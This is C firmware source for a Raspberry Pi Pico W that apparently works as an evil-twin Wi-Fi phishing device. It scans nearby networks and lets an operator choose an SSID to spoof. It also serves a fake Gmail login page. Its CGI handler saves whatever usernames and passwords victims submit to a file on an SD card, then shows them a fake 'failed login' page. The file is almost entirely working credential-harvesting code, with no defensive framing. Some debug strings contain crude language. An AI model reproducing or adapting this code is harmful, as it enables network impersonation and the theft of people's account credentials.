#include "lwip/apps/httpd.h"
#include "pico/cyw43_arch.h"
#include "hardware/adc.h"

#include "dhcpserver/dhcpserver.h"
#include "dnsserver/dnsserver.h"
#include "sd_card/sd_card.c"

#include <stdio.h>
#include "pico/stdlib.h"
#include "hw_config.h"
#include "f_util.h"
#include "ff.h"
#include "lib/no-OS-FatFS-SD-SDIO-SPI-RPi-Pico/src/ff15/source/ff.h"


void scan_wifi(void);
void print_scan_results(void);
#define MAX_SSID_LENGTH 32
#define MAX_SCAN_RESULTS 10

size_t printed;

char scan_results[MAX_SCAN_RESULTS][MAX_SSID_LENGTH];
int num_scan_results = 0;

void emptyScanResults() {
    printf("Emptying this bitch right now.");
    for (int i = 0; i < MAX_SCAN_RESULTS; i++) {
        for (int j = 0; j < MAX_SSID_LENGTH; j++) {
            scan_results[i][j] = '\0';
        }
    }
}


static int scan_result(void *env, const cyw43_ev_scan_result_t *result)
{
    if (result)
    {
        if (num_scan_results < MAX_SCAN_RESULTS)
        {
            strcpy(scan_results[num_scan_results], result-> ssid);
            num_scan_results++;
        }
    }
    return 0;
}


void print_scan_results()
{
    for (int i = 0; i < num_scan_results; ++i)
    {
        printf("SSID: %s\n", scan_results[i]);
    }
}


void scan_wifi()
{
    //////////////SCAN FOR WIFI////////////////////////////////
    absolute_time_t scan_time = nil_time;
    bool scan_in_progress = false;
    if (absolute_time_diff_us(get_absolute_time(), scan_time) < 0)
    {
        if (!scan_in_progress)
        {
            cyw43_wifi_scan_options_t scan_options = {0};
            int err = cyw43_wifi_scan(&cyw43_state, &scan_options, NULL, scan_result);
            if (err == 0)
            {
                print_scan_results();
                printf("bruv\n");
                printf("\nPerforming wifi scan\n");
                scan_in_progress = true;
            }
            else
            {
                printf("Failed to start scan: %d\n", err);
                scan_time = make_timeout_time_ms(10000); // wait 10s and scan again
            }
        }
        else if (!cyw43_wifi_scan_active(&cyw43_state))
        {
            scan_time = make_timeout_time_ms(10000); // wait 10s and scan again
            scan_in_progress = false;
        }
    }
    printf("Scaning wifi bich");
    return;
}

// SSI tags - tag length limited to 8 bytes by default.
// Limited to 10 Items now.
const char * ssi_tags[] = {"volt","temp","led","SSID1","SSID2","SSID3","SSID4","SSID5","SSID6","SSID7","SSID8","SSID9","SSID10"};

u16_t ssi_handler(int iIndex, char *pcInsert, int iInsertLen) {
  size_t printed;
  switch (iIndex) {
  case 0: // volt
    {
      const float voltage = adc_read() * 3.3f / (1 << 12);
      printed = snprintf(pcInsert, iInsertLen, "%f", voltage);
    }
    break;
  case 1: // temp
    {
    const float voltage = adc_read() * 3.3f / (1 << 12);
    const float tempC = 27.0f - (voltage - 0.706f) / 0.001721f;
    printed = snprintf(pcInsert, iInsertLen, "%f", tempC);
    }
    break;
  case 2: // led
    {
      bool led_status = cyw43_arch_gpio_get(CYW43_WL_GPIO_LED_PIN);
      if(led_status == true){
        printed = snprintf(pcInsert, iInsertLen, "ON");
      }
      else{
        printed = snprintf(pcInsert, iInsertLen, "OFF");
      }
    }
    break;
      case 3: // ssid
    {
    printed = snprintf(pcInsert, iInsertLen, "%s", scan_results[0]);
    }
    break;
      case 4: // ssid
    {
    printed = snprintf(pcInsert, iInsertLen, "%s", scan_results[1]);
    }
    break;
      case 5: // ssid
    {
    printed = snprintf(pcInsert, iInsertLen, "%s", scan_results[2]);
    }
    break;
      case 6: // ssid
    {
    printed = snprintf(pcInsert, iInsertLen, "%s", scan_results[3]);
    }
    break;
      case 7: // ssid
    {
    printed = snprintf(pcInsert, iInsertLen, "%s", scan_results[4]);
    }
    break;
      case 8: // ssid
    {
    printed = snprintf(pcInsert, iInsertLen, "%s", scan_results[5]);
    }
    break;
      case 9: // ssid
    {
    printed = snprintf(pcInsert, iInsertLen, "%s", scan_results[6]);
    }
    break;
      case 10: // ssid
    {
    printed = snprintf(pcInsert, iInsertLen, "%s", scan_results[7]);
    }
    break;
      case 11: // ssid
    {
    printed = snprintf(pcInsert, iInsertLen, "%s", scan_results[8]);
    }
    break;
      case 12: // ssid
    {
    printed = snprintf(pcInsert, iInsertLen, "%s", scan_results[9]);
    }
    break;
    

  default:
    printed = 0;
    break;
  }

  return (u16_t)printed;
}

// Initialise the SSI handler
void ssi_init() {
  // Initialise ADC (internal pin)
  adc_init();
  adc_set_temp_sensor_enabled(true);
  adc_select_input(4);
  print_scan_results();
  http_set_ssi_handler(ssi_handler, ssi_tags, LWIP_ARRAYSIZE(ssi_tags));
}


// Variable to hold input of which SSID to spoof and pass to main.
char* chosen_SSID;


typedef struct TCP_SERVER_T_ {
    struct tcp_pcb *server_pcb;
    bool complete;
    ip_addr_t gw;
    async_context_t *context;
} TCP_SERVER_T;

typedef struct TCP_CONNECT_STATE_T_ {
    struct tcp_pcb *pcb;
    int sent_len;
    char headers[512]; //128
    char result[2048]; // 256
    int header_len;
    int result_len;
    ip_addr_t *gw;
} TCP_CONNECT_STATE_T;

// CGI handler which is run when a request for /led.cgi is detected
// Not in use but useful but kept because useful to debug issues with cgi using pico led.
const char * cgi_led_handler(int iIndex, int iNumParams, char *pcParam[], char *pcValue[])
{
    // Check if an request for LED has been made (/led.cgi?led=x)
    if (strcmp(pcParam[0] , "led") == 0){
        // Look at the argument to check if LED is to be turned on (x=1) or off (x=0)
        if(strcmp(pcValue[0], "0") == 0)
            cyw43_arch_gpio_put(CYW43_WL_GPIO_LED_PIN, 0);
        else if(strcmp(pcValue[0], "1") == 0)
            cyw43_arch_gpio_put(CYW43_WL_GPIO_LED_PIN, 1);
    } 
    // Send the index page back to the user
    return "/index.shtml";
}

const char * cgi_ssid_handler(int iIndex, int iNumParams, char *pcParam[], char *pcValue[]){
    // If Username and password are passed in. We save it to a sd card and give them login failed. 
    if(strcmp(pcParam[0],"username") == 0){
        char* username = pcValue[0];
        // Santising URL encoding (changing "%40" back to "@")
        if(strstr(username, "\%40")){
            char* pointer = strstr(username, "\%40");
            *pointer = ' ';
            *(pointer+1)=' ';
            *(pointer+2)='@';
            printf("Username: %s", username);
        }
        printf("Username: %s \n Password:%s Being saved to SD Card.\n", pcValue[0], pcValue[1]);
        char* password = pcValue[1];
        FRESULT fr = initialiseSD();
        FIL fil;
        // Saving to SD Card. Multiple saves called to format output!
        char* filename = "CapturedInfo.txt";
        saveFile(filename, "\nUsername:", fr, fil );
        saveFile(filename, username, fr, fil );
        saveFile(filename, "    Password:", fr, fil );
        saveFile(filename, password, fr, fil );
        return "/failed_login.shtml";
    }

    // URL For fake gmail login
    if(strcmp(pcValue[0] ,"google") == 0){
        return "/gmail_login.shtml";
    }

    // URL for us to configure ssid to spoof. 
    else if(strcmp(pcValue[0] ,"config") == 0){
        return "/config.shtml";
    }

    // If There is a ssid being chosen to spoof. 
    else if(strcmp(pcParam[0],"ssid") == 0){
      chosen_SSID = pcValue[0];
      printf("Spoofing %s now", chosen_SSID);
      return "index.shtml";
    }
   
    // If Unmatch url entered, Return index page.
    return "/index.shtml";
}
 
// tCGI Struct
// Fill this with all of the CGI requests and their respective handlers
static const tCGI cgi_handlers[] = {
    {
        // Html request for "/led.cgi" triggers cgi_handler
        "/led.cgi", cgi_led_handler,
        
    },
    { 
        // If ssid.cgi called in web server  
        "/ssid.cgi", cgi_ssid_handler,
    },
};

void cgi_init(void)
{
    http_set_cgi_handlers(cgi_handlers, 2);
}